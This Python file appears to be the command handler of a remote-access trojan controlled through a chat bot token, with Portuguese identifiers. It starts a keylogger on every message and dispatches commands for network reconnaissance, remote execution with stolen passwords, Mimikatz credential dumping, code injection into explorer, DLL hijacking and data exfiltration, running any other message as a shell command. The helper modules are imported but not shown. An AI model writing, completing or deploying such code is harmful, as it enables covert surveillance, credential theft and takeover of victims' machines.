import subprocess, os, requests
from core import movimento_lateral
import exfiltracao
from core import mimikatz, injecao, dll_hijack
from core import keylogger



def tratar(msg, token, chat_id):
    keylogger.iniciar_keylogger(token, chat_id)

    if msg.startswith("/recon"):
        return movimento_lateral.scan_rede()
    
    elif msg.startswith("/exec "):
        try:
            _, ip, user, pwd, *cmd = msg.split(" ")
            comando = " ".join(cmd) if cmd else "hostname"
            return movimento_lateral.exec_remoto(ip, user, pwd, comando)
        except:
            return "Uso: /exec IP usuario senha [comando]"
    
    elif msg == "/mimikatz":
        return mimikatz.executar_mimikatz(token, chat_id)
    
    elif msg.startswith("/inject "):
        base64code = msg.replace("/inject ", "")
        return injecao.injetar_em_explorer(base64code)
    
    elif msg.startswith("/hijack "):
        _, dll, alvo = msg.split(" ")
        return dll_hijack.simular_hijack(dll, alvo)
    
    elif msg == "/exfiltrar":
        return exfiltracao.exfiltrar(token, chat_id)
    
    else:
        try:
            return subprocess.getoutput(msg)
        except: return "Erro ao executar comando."
